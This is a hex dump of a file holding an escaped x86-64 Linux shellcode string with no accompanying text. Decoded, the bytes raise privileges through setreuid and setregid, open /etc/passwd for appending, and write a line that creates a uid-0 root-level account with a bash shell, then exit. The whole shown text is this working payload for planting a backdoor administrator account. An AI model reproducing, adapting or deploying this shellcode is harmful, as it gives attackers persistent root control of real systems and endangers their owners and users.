00001220  5c 78 33 31 5c 78 63 30  5c 78 62 30 5c 78 37 31  |\x31\xc0\xb0\x71|
00001230  5c 78 34 38 5c 78 33 31  5c 78 64 62 5c 78 34 38  |\x48\x31\xdb\x48|
00001240  5c 78 38 39 5c 78 64 39  5c 78 30 66 5c 78 30 35  |\x89\xd9\x0f\x05|
00001250  5c 78 34 38 5c 78 33 31  22 0d 0a 3b 20 20 20 22  |\x48\x31"..;   "|
00001260  5c 78 63 30 5c 78 62 30  5c 78 37 32 5c 78 34 38  |\xc0\xb0\x72\x48|
00001270  5c 78 33 31 5c 78 64 62  5c 78 34 38 5c 78 38 39  |\x31\xdb\x48\x89|
00001280  5c 78 64 39 5c 78 30 66  5c 78 30 35 5c 78 34 38  |\xd9\x0f\x05\x48|
00001290  5c 78 33 31 5c 78 64 62  5c 78 62 62 22 0d 0a 3b  |\x31\xdb\xbb"..;|
000012a0  20 20 20 22 5c 78 66 66  5c 78 37 33 5c 78 37 37  |   "\xff\x73\x77|
000012b0  5c 78 36 34 5c 78 34 38  5c 78 63 31 5c 78 65 62  |\x64\x48\xc1\xeb|
000012c0  5c 78 30 38 5c 78 35 33  5c 78 34 38 5c 78 62 62  |\x08\x53\x48\xbb|
000012d0  5c 78 32 66 5c 78 36 35  5c 78 37 34 5c 78 36 33  |\x2f\x65\x74\x63|
000012e0  22 0d 0a 3b 20 20 20 22  5c 78 32 66 5c 78 37 30  |"..;   "\x2f\x70|
000012f0  5c 78 36 31 5c 78 37 33  5c 78 35 33 5c 78 34 38  |\x61\x73\x53\x48|
00001300  5c 78 62 62 5c 78 66 66  5c 78 36 65 5c 78 32 66  |\xbb\xff\x6e\x2f|
00001310  5c 78 36 32 5c 78 36 31  5c 78 37 33 5c 78 36 38  |\x62\x61\x73\x68|
00001320  5c 78 30 61 22 0d 0a 3b  20 20 20 22 5c 78 34 38  |\x0a"..;   "\x48|
00001330  5c 78 63 31 5c 78 65 62  5c 78 30 38 5c 78 35 33  |\xc1\xeb\x08\x53|
00001340  5c 78 34 38 5c 78 62 62  5c 78 37 32 5c 78 36 66  |\x48\xbb\x72\x6f|
00001350  5c 78 36 66 5c 78 37 34  5c 78 33 61 5c 78 32 66  |\x6f\x74\x3a\x2f|
00001360  5c 78 36 32 5c 78 36 39  22 0d 0a 3b 20 20 20 22  |\x62\x69"..;   "|
00001370  5c 78 35 33 5c 78 34 38  5c 78 62 62 5c 78 36 37  |\x53\x48\xbb\x67|
00001380  5c 78 33 61 5c 78 33 30  5c 78 33 61 5c 78 33 30  |\x3a\x30\x3a\x30|
00001390  5c 78 33 61 5c 78 33 61  5c 78 32 66 5c 78 35 33  |\x3a\x3a\x2f\x53|
000013a0  5c 78 34 38 5c 78 62 62  5c 78 33 35 22 0d 0a 3b  |\x48\xbb\x35"..;|
000013b0  20 20 20 22 5c 78 37 34  5c 78 35 38 5c 78 34 62  |   "\x74\x58\x4b|
000013c0  5c 78 35 35 5c 78 36 62  5c 78 35 35 5c 78 34 36  |\x55\x6b\x55\x46|
000013d0  5c 78 35 33 5c 78 34 38  5c 78 62 62 5c 78 37 34  |\x53\x48\xbb\x74|
000013e0  5c 78 33 30 5c 78 37 32  5c 78 33 61 5c 78 33 33  |\x30\x72\x3a\x33|
000013f0  22 0d 0a 3b 20 20 20 22  5c 78 35 35 5c 78 36 37  |"..;   "\x55\x67|
00001400  5c 78 35 34 5c 78 35 33  5c 78 34 38 5c 78 38 39  |\x54\x53\x48\x89|
00001410  5c 78 65 33 5c 78 35 35  5c 78 34 38 5c 78 38 39  |\xe3\x55\x48\x89|
00001420  5c 78 65 35 5c 78 34 38  5c 78 38 33 5c 78 65 63  |\xe5\x48\x83\xec|
00001430  5c 78 31 30 22 0d 0a 3b  20 20 20 22 5c 78 34 38  |\x10"..;   "\x48|
00001440  5c 78 38 39 5c 78 35 64  5c 78 66 30 5c 78 36 36  |\x89\x5d\xf0\x66|
00001450  5c 78 62 65 5c 78 30 31  5c 78 30 34 5c 78 34 38  |\xbe\x01\x04\x48|
00001460  5c 78 38 39 5c 78 64 66  5c 78 34 38 5c 78 38 33  |\x89\xdf\x48\x83|
00001470  5c 78 63 37 5c 78 32 38  22 0d 0a 3b 20 20 20 22  |\xc7\x28"..;   "|
00001480  5c 78 34 38 5c 78 33 31  5c 78 63 30 5c 78 62 30  |\x48\x31\xc0\xb0|
00001490  5c 78 30 32 5c 78 30 66  5c 78 30 35 5c 78 38 39  |\x02\x0f\x05\x89|
000014a0  5c 78 34 35 5c 78 66 63  5c 78 34 38 5c 78 38 39  |\x45\xfc\x48\x89|
000014b0  5c 78 64 39 5c 78 34 38  5c 78 33 31 22 0d 0a 3b  |\xd9\x48\x31"..;|
000014c0  20 20 20 22 5c 78 64 32  5c 78 62 32 5c 78 32 37  |   "\xd2\xb2\x27|
000014d0  5c 78 34 38 5c 78 38 39  5c 78 63 65 5c 78 34 38  |\x48\x89\xce\x48|
000014e0  5c 78 38 39 5c 78 63 37  5c 78 34 38 5c 78 33 31  |\x89\xc7\x48\x31|
000014f0  5c 78 63 30 5c 78 62 30  5c 78 30 31 5c 78 30 66  |\xc0\xb0\x01\x0f|
00001500  22 0d 0a 3b 20 20 20 22  5c 78 30 35 5c 78 34 38  |"..;   "\x05\x48|
00001510  5c 78 33 31 5c 78 66 66  5c 78 38 62 5c 78 37 64  |\x31\xff\x8b\x7d|
00001520  5c 78 66 63 5c 78 34 38  5c 78 33 31 5c 78 63 30  |\xfc\x48\x31\xc0|
00001530  5c 78 62 30 5c 78 30 33  5c 78 30 66 5c 78 30 35  |\xb0\x03\x0f\x05|
00001540  5c 78 34 38 22 0d 0a 3b  20 20 20 22 5c 78 33 31  |\x48"..;   "\x31|
00001550  5c 78 63 30 5c 78 62 30  5c 78 33 63 5c 78 34 38  |\xc0\xb0\x3c\x48|
00001560  5c 78 33 31 5c 78 64 62  5c 78 30 66 5c 78 30 35  |\x31\xdb\x0f\x05|
00001570  22 3b                                             |";|
00001572
